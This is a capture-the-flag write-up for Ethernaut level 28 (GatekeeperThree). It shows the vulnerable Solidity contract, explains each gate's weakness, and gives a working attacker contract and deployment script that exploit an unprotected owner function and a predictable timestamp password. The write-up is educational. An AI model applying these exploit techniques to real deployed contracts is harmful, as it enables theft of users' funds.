# Ethernaut Level 28 GatekeeperThree

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

We have to pass the three gates, register as an entrant and pass the game. `gateOne()` requires that the transaction initiator should not be the `msg.sender`, so we need a middle layer to call the `enter()` function. In `gateTwo()`, we need to get the allowance from the `trick`. So we have to first call `createTrick()` to deploy the contract, then put in the correct `uint256 _password` to get the allowance. In `gateThree()`, we need to send the gate an amount of eth and the owner, which we can call `construct0r()` to claim, should not be payable.

Based on these thoughts, we can create the middle layer:

`MiddleLayer.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperThree} from "./GatekeeperThree.sol";

contract MiddleLayer {
    GatekeeperThree public target;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function attack() external payable{
        require (msg.value > 0.001 ether, "Insufficient Ether sent");
        (bool ok, ) = address(target).call{value: msg.value}(""); 
        require(ok);

        target.construct0r();
        target.createTrick();
        target.getAllowance(block.timestamp);

        target.enter();
    }
}
```

Notice that here we directly use `block.timestamp` as password, though we have `createTrick()` and initialized the password before. The `block.timestamp` is still going to match because these steps are in a single function `attack()`, and they will be in one single transaction and one single block. 

`GatekeeperThree.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {MiddleLayer} from "../src/MiddleLayer.sol";

contract GatekeeperThreeScript is Script {
    address constant GATE_ADDRESS = 0xXXXXXXXXX;
    MiddleLayer middleLayer;

    function run() external {
        vm.startBroadcast();
        middleLayer = new MiddleLayer(payable(GATE_ADDRESS));
        middleLayer.attack{value: 0.011 ether}();
        vm.stopBroadcast();
    }
}
```

